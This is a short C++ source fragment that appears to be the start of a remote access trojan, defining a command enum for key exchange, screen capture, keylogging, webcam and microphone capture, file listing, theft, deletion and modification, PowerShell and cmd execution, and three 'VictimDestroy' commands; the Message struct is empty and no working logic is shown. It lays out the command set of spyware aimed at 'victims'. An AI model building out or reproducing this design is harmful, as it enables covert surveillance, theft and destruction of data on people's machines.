#include <bits/stdc++.h>

enum MessageEnum {
    MessageExchangePublicKey,
    MessageRawText,
    MessageContinueMessage,
    MessageEnableScreenCap,
    MessageDisableScreenCap,
    MessageEnableKeylog,
    MessageDisableKeylog,
    MessageEnableWebcam,
    MessageDisableWebcam,
    MessageEnableMicro,     //expermental
    MessageDisableMicro,    //expermental
    MessageListFile,
    MessageGetFile,
    MessageDeleteFile,
    MessageModifyFile,
    MessageInvokePowershell,
    MessageInvokeCmd,
    MessageVictimDestroy1,
    MessageVictimDestroy2,
    MessageVictimDestroy3,
};

struct Message {

};